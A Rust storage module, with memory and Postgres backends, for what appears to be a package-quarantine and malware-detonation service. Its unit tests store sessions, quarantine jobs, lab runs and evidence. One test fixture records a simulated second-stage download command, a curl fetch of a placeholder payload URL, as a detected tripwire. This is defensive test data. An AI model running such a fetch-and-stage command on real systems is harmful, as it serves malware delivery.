use std::{collections::BTreeMap, sync::Arc};

use async_trait::async_trait;
use chrono::Utc;
use sqlx::{PgPool, Row, postgres::PgPoolOptions, types::Json};
use tokio::sync::RwLock;
use uuid::Uuid;

use crate::{
    manifest::ManifestCatalog,
    types::{
        ArtifactKey, CacheEntry, CapturedRequest, EvidenceBundle, HourlyFeedRecord, LabRun,
        ManifestRecord, NodeSession, PolicySnapshot, QuarantineJob,
    },
};

#[derive(Debug, thiserror::Error)]
pub enum StoreError {
    #[error("sqlx error: {0}")]
    Sqlx(#[from] sqlx::Error),
    #[error("not found")]
    NotFound,
}

#[async_trait]
pub trait Store: Send + Sync {
    async fn upsert_node_session(&self, session: NodeSession) -> Result<NodeSession, StoreError>;
    async fn list_node_sessions(&self) -> Result<Vec<NodeSession>, StoreError>;
    async fn heartbeat_node(&self, node_id: &str) -> Result<(), StoreError>;
    async fn set_policy_snapshot(&self, snapshot: PolicySnapshot) -> Result<(), StoreError>;
    async fn get_policy_snapshot(&self) -> Result<Option<PolicySnapshot>, StoreError>;
    async fn record_captured_request(&self, request: CapturedRequest) -> Result<(), StoreError>;
    async fn update_captured_request_trace(
        &self,
        request_id: uuid::Uuid,
        trace: crate::types::ProxyTrace,
    ) -> Result<(), StoreError>;
    async fn list_captured_requests(&self) -> Result<Vec<CapturedRequest>, StoreError>;
    async fn upsert_manifest_record(&self, record: ManifestRecord) -> Result<(), StoreError>;
    async fn list_manifest_records(&self) -> Result<Vec<ManifestRecord>, StoreError>;
    async fn put_cache_entry(&self, entry: CacheEntry) -> Result<(), StoreError>;
    async fn get_cache_entry(
        &self,
        key: &ArtifactKey,
        domain: crate::types::CacheDomain,
    ) -> Result<Option<CacheEntry>, StoreError>;
    async fn upsert_quarantine_job(&self, job: QuarantineJob) -> Result<QuarantineJob, StoreError>;
    async fn get_quarantine_job(
        &self,
        key: &ArtifactKey,
    ) -> Result<Option<QuarantineJob>, StoreError>;
    async fn list_quarantine_jobs(&self) -> Result<Vec<QuarantineJob>, StoreError>;
    async fn upsert_lab_run(&self, run: LabRun) -> Result<LabRun, StoreError>;
    async fn list_lab_runs(&self) -> Result<Vec<LabRun>, StoreError>;
    async fn record_evidence_bundle(&self, bundle: EvidenceBundle) -> Result<(), StoreError>;
    async fn list_evidence_bundles(&self) -> Result<Vec<EvidenceBundle>, StoreError>;
    async fn put_feed_record(&self, record: HourlyFeedRecord) -> Result<(), StoreError>;
    async fn list_feed_records(&self) -> Result<Vec<HourlyFeedRecord>, StoreError>;
}

#[derive(Default)]
struct MemoryState {
    policy: Option<PolicySnapshot>,
    nodes: BTreeMap<String, NodeSession>,
    requests: Vec<CapturedRequest>,
    manifest_records: Vec<ManifestRecord>,
    cache_entries: Vec<CacheEntry>,
    quarantine_jobs: BTreeMap<String, QuarantineJob>,
    lab_runs: BTreeMap<Uuid, LabRun>,
    evidence_bundles: Vec<EvidenceBundle>,
    feed_records: Vec<HourlyFeedRecord>,
}

#[derive(Clone, Default)]
pub struct MemoryStore {
    state: Arc<RwLock<MemoryState>>,
}

impl MemoryStore {
    pub async fn seeded() -> Self {
        let store = Self::default();
        for record in ManifestCatalog::sample().records {
            let _ = store.upsert_manifest_record(record).await;
        }
        let _ = store
            .set_policy_snapshot(PolicySnapshot {
                version: "dev-seed".to_string(),
                generated_at: Utc::now(),
                config: crate::sample_policy(),
            })
            .await;
        store
    }
}

#[async_trait]
impl Store for MemoryStore {
    async fn upsert_node_session(&self, session: NodeSession) -> Result<NodeSession, StoreError> {
        self.state
            .write()
            .await
            .nodes
            .insert(session.node_id.clone(), session.clone());
        Ok(session)
    }

    async fn heartbeat_node(&self, node_id: &str) -> Result<(), StoreError> {
        let mut state = self.state.write().await;
        let session = state.nodes.get_mut(node_id).ok_or(StoreError::NotFound)?;
        session.last_seen_at = Utc::now();
        Ok(())
    }

    async fn list_node_sessions(&self) -> Result<Vec<NodeSession>, StoreError> {
        Ok(self.state.read().await.nodes.values().cloned().collect())
    }

    async fn set_policy_snapshot(&self, snapshot: PolicySnapshot) -> Result<(), StoreError> {
        self.state.write().await.policy = Some(snapshot);
        Ok(())
    }

    async fn get_policy_snapshot(&self) -> Result<Option<PolicySnapshot>, StoreError> {
        Ok(self.state.read().await.policy.clone())
    }

    async fn record_captured_request(&self, request: CapturedRequest) -> Result<(), StoreError> {
        let mut state = self.state.write().await;
        if let Some(existing) = state
            .requests
            .iter_mut()
            .find(|existing| existing.request_id == request.request_id)
        {
            *existing = request;
        } else {
            state.requests.push(request);
        }
        Ok(())
    }

    async fn update_captured_request_trace(
        &self,
        request_id: Uuid,
        trace: crate::types::ProxyTrace,
    ) -> Result<(), StoreError> {
        let mut state = self.state.write().await;
        if let Some(request) = state
            .requests
            .iter_mut()
            .find(|request| request.request_id == request_id)
        {
            request.trace = trace;
        }
        Ok(())
    }

    async fn list_captured_requests(&self) -> Result<Vec<CapturedRequest>, StoreError> {
        Ok(self.state.read().await.requests.clone())
    }

    async fn upsert_manifest_record(&self, record: ManifestRecord) -> Result<(), StoreError> {
        let mut state = self.state.write().await;
        if let Some(existing) = state.manifest_records.iter_mut().find(|existing| {
            existing.source == record.source
                && existing.requested_selector == record.requested_selector
                && existing.ecosystem == record.ecosystem
        }) {
            *existing = record;
        } else {
            state.manifest_records.push(record);
        }
        Ok(())
    }

    async fn list_manifest_records(&self) -> Result<Vec<ManifestRecord>, StoreError> {
        Ok(self.state.read().await.manifest_records.clone())
    }

    async fn put_cache_entry(&self, entry: CacheEntry) -> Result<(), StoreError> {
        let mut state = self.state.write().await;
        state.cache_entries.retain(|existing| {
            !(existing.artifact_key == entry.artifact_key && existing.domain == entry.domain)
        });
        state.cache_entries.push(entry);
        Ok(())
    }

    async fn get_cache_entry(
        &self,
        key: &ArtifactKey,
        domain: crate::types::CacheDomain,
    ) -> Result<Option<CacheEntry>, StoreError> {
        Ok(self
            .state
            .read()
            .await
            .cache_entries
            .iter()
            .find(|entry| &entry.artifact_key == key && entry.domain == domain)
            .cloned())
    }

    async fn upsert_quarantine_job(&self, job: QuarantineJob) -> Result<QuarantineJob, StoreError> {
        self.state
            .write()
            .await
            .quarantine_jobs
            .insert(quarantine_key(&job.artifact_key), job.clone());
        Ok(job)
    }

    async fn get_quarantine_job(
        &self,
        key: &ArtifactKey,
    ) -> Result<Option<QuarantineJob>, StoreError> {
        Ok(self
            .state
            .read()
            .await
            .quarantine_jobs
            .get(&quarantine_key(key))
            .cloned())
    }

    async fn list_quarantine_jobs(&self) -> Result<Vec<QuarantineJob>, StoreError> {
        Ok(self
            .state
            .read()
            .await
            .quarantine_jobs
            .values()
            .cloned()
            .collect())
    }

    async fn upsert_lab_run(&self, run: LabRun) -> Result<LabRun, StoreError> {
        self.state
            .write()
            .await
            .lab_runs
            .insert(run.run_id, run.clone());
        Ok(run)
    }

    async fn list_lab_runs(&self) -> Result<Vec<LabRun>, StoreError> {
        Ok(self.state.read().await.lab_runs.values().cloned().collect())
    }

    async fn record_evidence_bundle(&self, bundle: EvidenceBundle) -> Result<(), StoreError> {
        self.state.write().await.evidence_bundles.push(bundle);
        Ok(())
    }

    async fn list_evidence_bundles(&self) -> Result<Vec<EvidenceBundle>, StoreError> {
        Ok(self.state.read().await.evidence_bundles.clone())
    }

    async fn put_feed_record(&self, record: HourlyFeedRecord) -> Result<(), StoreError> {
        self.state.write().await.feed_records.push(record);
        Ok(())
    }

    async fn list_feed_records(&self) -> Result<Vec<HourlyFeedRecord>, StoreError> {
        Ok(self.state.read().await.feed_records.clone())
    }
}

#[derive(Clone)]
pub struct PostgresStore {
    pool: PgPool,
}

impl PostgresStore {
    pub async fn connect(database_url: &str) -> Result<Self, StoreError> {
        let pool = PgPoolOptions::new()
            .max_connections(5)
            .connect(database_url)
            .await?;
        Ok(Self { pool })
    }
}

#[async_trait]
impl Store for PostgresStore {
    async fn upsert_node_session(&self, session: NodeSession) -> Result<NodeSession, StoreError> {
        sqlx::query(
            "insert into node_sessions (node_id, payload, last_seen_at) values ($1, $2, $3)
             on conflict (node_id) do update set payload = excluded.payload, last_seen_at = excluded.last_seen_at",
        )
        .bind(&session.node_id)
        .bind(Json(session.clone()))
        .bind(session.last_seen_at)
        .execute(&self.pool)
        .await?;
        Ok(session)
    }

    async fn heartbeat_node(&self, node_id: &str) -> Result<(), StoreError> {
        sqlx::query("update node_sessions set last_seen_at = now() where node_id = $1")
            .bind(node_id)
            .execute(&self.pool)
            .await?;
        Ok(())
    }

    async fn list_node_sessions(&self) -> Result<Vec<NodeSession>, StoreError> {
        let rows = sqlx::query("select payload from node_sessions order by last_seen_at desc")
            .fetch_all(&self.pool)
            .await?;
        Ok(rows
            .into_iter()
            .map(|row| row.get::<Json<NodeSession>, _>("payload").0)
            .collect())
    }

    async fn set_policy_snapshot(&self, snapshot: PolicySnapshot) -> Result<(), StoreError> {
        sqlx::query(
            "insert into policy_snapshots (version, payload, generated_at) values ($1, $2, $3)
             on conflict (version) do update set payload = excluded.payload, generated_at = excluded.generated_at",
        )
        .bind(&snapshot.version)
        .bind(Json(snapshot.clone()))
        .bind(snapshot.generated_at)
        .execute(&self.pool)
        .await?;
        Ok(())
    }

    async fn get_policy_snapshot(&self) -> Result<Option<PolicySnapshot>, StoreError> {
        let row =
            sqlx::query("select payload from policy_snapshots order by generated_at desc limit 1")
                .fetch_optional(&self.pool)
                .await?;
        Ok(row.map(|row| row.get::<Json<PolicySnapshot>, _>("payload").0))
    }

    async fn record_captured_request(&self, request: CapturedRequest) -> Result<(), StoreError> {
        sqlx::query(
            "insert into captured_requests (request_id, observed_at, lane, payload) values ($1, $2, $3, $4)
             on conflict (request_id) do update set observed_at = excluded.observed_at, lane = excluded.lane, payload = excluded.payload",
        )
        .bind(request.request_id)
        .bind(request.observation.observed_at)
        .bind(format!("{:?}", request.classification.lane))
        .bind(Json(request))
        .execute(&self.pool)
        .await?;
        Ok(())
    }

    async fn update_captured_request_trace(
        &self,
        request_id: Uuid,
        trace: crate::types::ProxyTrace,
    ) -> Result<(), StoreError> {
        sqlx::query(
            "update captured_requests set payload = jsonb_set(payload, '{trace}', $2) where request_id = $1",
        )
        .bind(request_id)
        .bind(Json(trace))
        .execute(&self.pool)
        .await?;
        Ok(())
    }

    async fn list_captured_requests(&self) -> Result<Vec<CapturedRequest>, StoreError> {
        let rows = sqlx::query("select payload from captured_requests order by observed_at desc")
            .fetch_all(&self.pool)
            .await?;
        Ok(rows
            .into_iter()
            .map(|row| row.get::<Json<CapturedRequest>, _>("payload").0)
            .collect())
    }

    async fn upsert_manifest_record(&self, record: ManifestRecord) -> Result<(), StoreError> {
        let key = manifest_key(&record);
        sqlx::query(
            "insert into artifacts (artifact_key, status, payload) values ($1, $2, $3)
             on conflict (artifact_key) do update set status = excluded.status, payload = excluded.payload",
        )
        .bind(key)
        .bind(format!("{:?}", record.status))
        .bind(Json(record))
        .execute(&self.pool)
        .await?;
        Ok(())
    }

    async fn list_manifest_records(&self) -> Result<Vec<ManifestRecord>, StoreError> {
        let rows = sqlx::query("select payload from artifacts")
            .fetch_all(&self.pool)
            .await?;
        Ok(rows
            .into_iter()
            .map(|row| row.get::<Json<ManifestRecord>, _>("payload").0)
            .collect())
    }

    async fn put_cache_entry(&self, entry: CacheEntry) -> Result<(), StoreError> {
        sqlx::query(
            "insert into artifact_blobs (artifact_key, domain, payload) values ($1, $2, $3)
             on conflict (artifact_key, domain) do update set payload = excluded.payload",
        )
        .bind(quarantine_key(&entry.artifact_key))
        .bind(format!("{:?}", entry.domain))
        .bind(Json(entry))
        .execute(&self.pool)
        .await?;
        Ok(())
    }

    async fn get_cache_entry(
        &self,
        key: &ArtifactKey,
        domain: crate::types::CacheDomain,
    ) -> Result<Option<CacheEntry>, StoreError> {
        let row = sqlx::query(
            "select payload from artifact_blobs where artifact_key = $1 and domain = $2",
        )
        .bind(quarantine_key(key))
        .bind(format!("{:?}", domain))
        .fetch_optional(&self.pool)
        .await?;
        Ok(row.map(|row| row.get::<Json<CacheEntry>, _>("payload").0))
    }

    async fn upsert_quarantine_job(&self, job: QuarantineJob) -> Result<QuarantineJob, StoreError> {
        sqlx::query(
            "insert into quarantine_jobs (job_id, artifact_key, status, payload) values ($1, $2, $3, $4)
             on conflict (artifact_key) do update set status = excluded.status, payload = excluded.payload",
        )
        .bind(job.job_id)
        .bind(quarantine_key(&job.artifact_key))
        .bind(format!("{:?}", job.status))
        .bind(Json(job.clone()))
        .execute(&self.pool)
        .await?;
        Ok(job)
    }

    async fn get_quarantine_job(
        &self,
        key: &ArtifactKey,
    ) -> Result<Option<QuarantineJob>, StoreError> {
        let row = sqlx::query("select payload from quarantine_jobs where artifact_key = $1")
            .bind(quarantine_key(key))
            .fetch_optional(&self.pool)
            .await?;
        Ok(row.map(|row| row.get::<Json<QuarantineJob>, _>("payload").0))
    }

    async fn list_quarantine_jobs(&self) -> Result<Vec<QuarantineJob>, StoreError> {
        let rows = sqlx::query("select payload from quarantine_jobs order by job_id desc")
            .fetch_all(&self.pool)
            .await?;
        Ok(rows
            .into_iter()
            .map(|row| row.get::<Json<QuarantineJob>, _>("payload").0)
            .collect())
    }

    async fn upsert_lab_run(&self, run: LabRun) -> Result<LabRun, StoreError> {
        sqlx::query(
            "insert into lab_runs (run_id, artifact_key, status, payload) values ($1, $2, $3, $4)
             on conflict (run_id) do update set status = excluded.status, payload = excluded.payload",
        )
        .bind(run.run_id)
        .bind(quarantine_key(&run.artifact_key))
        .bind(format!("{:?}", run.status))
        .bind(Json(run.clone()))
        .execute(&self.pool)
        .await?;
        Ok(run)
    }

    async fn list_lab_runs(&self) -> Result<Vec<LabRun>, StoreError> {
        let rows = sqlx::query("select payload from lab_runs order by run_id desc")
            .fetch_all(&self.pool)
            .await?;
        Ok(rows
            .into_iter()
            .map(|row| row.get::<Json<LabRun>, _>("payload").0)
            .collect())
    }

    async fn record_evidence_bundle(&self, bundle: EvidenceBundle) -> Result<(), StoreError> {
        sqlx::query(
            "insert into evidence_records (evidence_id, artifact_key, payload) values ($1, $2, $3)
             on conflict (evidence_id) do update set payload = excluded.payload",
        )
        .bind(bundle.evidence_id)
        .bind(quarantine_key(&bundle.artifact_key))
        .bind(Json(bundle))
        .execute(&self.pool)
        .await?;
        Ok(())
    }

    async fn list_evidence_bundles(&self) -> Result<Vec<EvidenceBundle>, StoreError> {
        let rows = sqlx::query("select payload from evidence_records")
            .fetch_all(&self.pool)
            .await?;
        Ok(rows
            .into_iter()
            .map(|row| row.get::<Json<EvidenceBundle>, _>("payload").0)
            .collect())
    }

    async fn put_feed_record(&self, record: HourlyFeedRecord) -> Result<(), StoreError> {
        sqlx::query(
            "insert into feed_records (feed_id, first_seen_at, payload) values ($1, $2, $3)
             on conflict (feed_id) do update set payload = excluded.payload",
        )
        .bind(Uuid::new_v4())
        .bind(record.first_seen_at)
        .bind(Json(record))
        .execute(&self.pool)
        .await?;
        Ok(())
    }

    async fn list_feed_records(&self) -> Result<Vec<HourlyFeedRecord>, StoreError> {
        let rows = sqlx::query("select payload from feed_records order by first_seen_at desc")
            .fetch_all(&self.pool)
            .await?;
        Ok(rows
            .into_iter()
            .map(|row| row.get::<Json<HourlyFeedRecord>, _>("payload").0)
            .collect())
    }
}

#[derive(Clone)]
pub struct StoreHandle(pub Arc<dyn Store>);

impl StoreHandle {
    pub fn from_memory(store: MemoryStore) -> Self {
        Self(Arc::new(store))
    }

    pub async fn connect_from_env() -> Result<Self, StoreError> {
        if let Ok(database_url) = std::env::var("DATABASE_URL") {
            let store = PostgresStore::connect(&database_url).await?;
            Ok(Self(Arc::new(store)))
        } else {
            Ok(Self(Arc::new(MemoryStore::seeded().await)))
        }
    }

    pub async fn connect(database_url: Option<&str>) -> Result<Self, StoreError> {
        if let Some(database_url) = database_url {
            let store = PostgresStore::connect(database_url).await?;
            Ok(Self(Arc::new(store)))
        } else {
            Self::connect_from_env().await
        }
    }
}

fn quarantine_key(key: &ArtifactKey) -> String {
    format!(
        "{:?}|{}|{}|{:?}",
        key.ecosystem, key.source, key.requested_selector, key.selector_kind
    )
}

fn manifest_key(record: &ManifestRecord) -> String {
    quarantine_key(&ArtifactKey {
        ecosystem: record.ecosystem,
        source: record.source.clone(),
        requested_selector: record.requested_selector.clone(),
        selector_kind: record.selector_kind,
    })
}

#[cfg(test)]
mod tests {
    use chrono::Utc;
    use uuid::Uuid;

    use super::{MemoryStore, Store};
    use crate::{
        ApprovalStatus, ArtifactCoordinate, ArtifactKey, CacheDomain, CacheEntry, CapturedRequest,
        Classification, ClientVisibleOutcome, CodeIntent, DetectionSeverity, DetonationPersona,
        DetonationScenario, Ecosystem, EvidenceBundle, EvidenceEvent, HourlyFeedRecord, LabRun,
        LabRunStatus, NodeSession, ProxyAction, QuarantineJob, QuarantineStatus,
        RequestObservation, SelectorKind, TrafficLane, TripwireKind,
    };

    #[tokio::test]
    async fn memory_store_round_trips_cache_entries() {
        let store = MemoryStore::seeded().await;
        let key = ArtifactKey {
            ecosystem: Ecosystem::Archive,
            source: "https://github.com/acme/tool/archive.tar.gz".to_string(),
            requested_selector: "v1.0.0".to_string(),
            selector_kind: SelectorKind::Tag,
        };
        let entry = CacheEntry {
            artifact_key: key.clone(),
            domain: CacheDomain::Quarantine,
            storage_path: "/tmp/example".to_string(),
            created_at: Utc::now(),
            size_bytes: Some(42),
            digest_sha256: "deadbeef".to_string(),
        };
        store
            .put_cache_entry(entry.clone())
            .await
            .expect("cache put");
        let loaded = store
            .get_cache_entry(&key, CacheDomain::Quarantine)
            .await
            .expect("cache get")
            .expect("entry");
        assert_eq!(loaded.digest_sha256, entry.digest_sha256);
    }

    #[tokio::test]
    async fn memory_store_round_trips_node_sessions_and_requests() {
        let store = MemoryStore::seeded().await;
        let session = NodeSession {
            node_id: "node-1".to_string(),
            user_label: "developer".to_string(),
            hostname: "host-1".to_string(),
            policy_version: "v1".to_string(),
            ca_version: "ca-v1".to_string(),
            transparent_capture: true,
            last_seen_at: Utc::now(),
        };
        store
            .upsert_node_session(session.clone())
            .await
            .expect("session");

        let request = CapturedRequest {
            request_id: Uuid::new_v4(),
            observation: RequestObservation {
                request_id: Uuid::new_v4(),
                observed_at: Utc::now(),
                scheme: "https".to_string(),
                authority: "github.com".to_string(),
                path: "/acme/lib.git".to_string(),
                method: "GET".to_string(),
                user_agent: Some("git/2.47".to_string()),
                headers: Default::default(),
                selector_hint: None,
            },
            classification: Classification {
                lane: TrafficLane::CodeIntake,
                ecosystem: Some(Ecosystem::Git),
                intent: CodeIntent::GitRemote,
                reason: "known Git hosting domain".to_string(),
                confidence: 95,
                requires_quarantine: true,
                host_family: Some("github.com".to_string()),
            },
            proxy_action: ProxyAction::Pending,
            status_code: Some(403),
            bytes_in: Some(0),
            bytes_out: Some(0),
            stored_body: true,
            client_outcome: Some(ClientVisibleOutcome::TemporaryFailure),
            decision_reason: "fail closed".to_string(),
            artifact_key: None,
            trace: crate::types::ProxyTrace::new(None, None, Utc::now())
                .with_decision("initial request captured"),
        };
        store
            .record_captured_request(request.clone())
            .await
            .expect("request");

        let sessions = store.list_node_sessions().await.expect("sessions");
        let requests = store.list_captured_requests().await.expect("requests");
        assert_eq!(sessions.len(), 1);
        assert_eq!(sessions[0].node_id, session.node_id);
        assert_eq!(requests.len(), 1);
        assert_eq!(requests[0].decision_reason, request.decision_reason);
        assert!(requests[0].trace.decision_at.is_some());
    }

    #[tokio::test]
    async fn memory_store_round_trips_quarantine_jobs_evidence_and_feed() {
        let store = MemoryStore::seeded().await;
        let artifact_key = ArtifactKey {
            ecosystem: Ecosystem::Archive,
            source: "https://github.com/acme/tool/releases/download/v2.0.0/tool.tar.gz".to_string(),
            requested_selector: "v2.0.0".to_string(),
            selector_kind: SelectorKind::Tag,
        };
        let cache = CacheEntry {
            artifact_key: artifact_key.clone(),
            domain: CacheDomain::Quarantine,
            storage_path: "/tmp/quarantine".to_string(),
            created_at: Utc::now(),
            size_bytes: Some(128),
            digest_sha256: "deadbeef".to_string(),
        };
        let job = QuarantineJob {
            job_id: Uuid::new_v4(),
            artifact_key: artifact_key.clone(),
            status: QuarantineStatus::Analyzing,
            created_at: Utc::now(),
            hold_until: Utc::now(),
            last_error: None,
            cache_entry: Some(cache),
        };
        store.upsert_quarantine_job(job.clone()).await.expect("job");

        let run = LabRun {
            run_id: Uuid::new_v4(),
            artifact_key: artifact_key.clone(),
            status: LabRunStatus::Running,
            planned_at: Utc::now(),
            started_at: Some(Utc::now()),
            finished_at: None,
            personas: vec![DetonationPersona::DeveloperWorkstation],
            scenarios: vec![DetonationScenario::InstallBuild],
            firecracker_config_path: None,
            firecracker_api_socket: None,
            tap_device: None,
            command_preview: vec!["/bin/true".to_string()],
            notes: vec!["running".to_string()],
        };
        store.upsert_lab_run(run.clone()).await.expect("run");

        let evidence = EvidenceBundle {
            evidence_id: Uuid::new_v4(),
            artifact_key: artifact_key.clone(),
            run_id: Some(run.run_id),
            summary: crate::lab::TripwireEvaluator::evaluate(
                crate::ArtifactCoordinate {
                    ecosystem: artifact_key.ecosystem,
                    source: artifact_key.source.clone(),
                    requested_selector: artifact_key.requested_selector.clone(),
                    selector_kind: artifact_key.selector_kind,
                },
                DetonationPersona::DeveloperWorkstation,
                DetonationScenario::InstallBuild,
                vec![EvidenceEvent {
                    timestamp: Utc::now(),
                    kind: TripwireKind::Downloader,
                    subject: "https://example.invalid/payload".to_string(),
                    detail: "second stage fetch".to_string(),
                    severity: DetectionSeverity::High,
                    phase: Some(crate::types::PackageLifecyclePhase::Install),
                    process_lineage: vec!["curl https://example.invalid/payload".to_string()],
                    command: Some("curl https://example.invalid/payload".to_string()),
                    file_path: None,
                    network_target: Some("example.invalid".to_string()),
                    network_protocol: Some("https".to_string()),
                    sinkhole_transcript_sha256: None,
                    scenario_step: Some("download".to_string()),
                    canary_id: None,
                    attack_family_tag: None,
                }],
            ),
            sinkhole_transcript: vec!["sinkhole hit".to_string()],
        };
        store
            .record_evidence_bundle(evidence.clone())
            .await
            .expect("evidence");

        store
            .put_feed_record(HourlyFeedRecord {
                artifact: ArtifactCoordinate {
                    ecosystem: artifact_key.ecosystem,
                    source: artifact_key.source.clone(),
                    requested_selector: artifact_key.requested_selector.clone(),
                    selector_kind: artifact_key.selector_kind,
                },
                status: ApprovalStatus::Blocked,
                first_seen_at: Utc::now(),
                confidence: DetectionSeverity::High,
                trigger_category: Some(TripwireKind::Downloader),
                recommended_action: "hold and inspect".to_string(),
                approved_fallback: None,
            })
            .await
            .expect("feed");

        assert_eq!(store.list_quarantine_jobs().await.expect("jobs").len(), 1);
        assert_eq!(store.list_lab_runs().await.expect("runs").len(), 1);
        assert_eq!(
            store.list_evidence_bundles().await.expect("evidence").len(),
            1
        );
        assert_eq!(store.list_feed_records().await.expect("feed").len(), 1);
        assert_eq!(
            store
                .get_quarantine_job(&artifact_key)
                .await
                .expect("job get")
                .expect("job")
                .status,
            QuarantineStatus::Analyzing
        );
        assert_eq!(
            store
                .get_cache_entry(&artifact_key, CacheDomain::Quarantine)
                .await
                .expect("cache get"),
            None
        );
    }
}
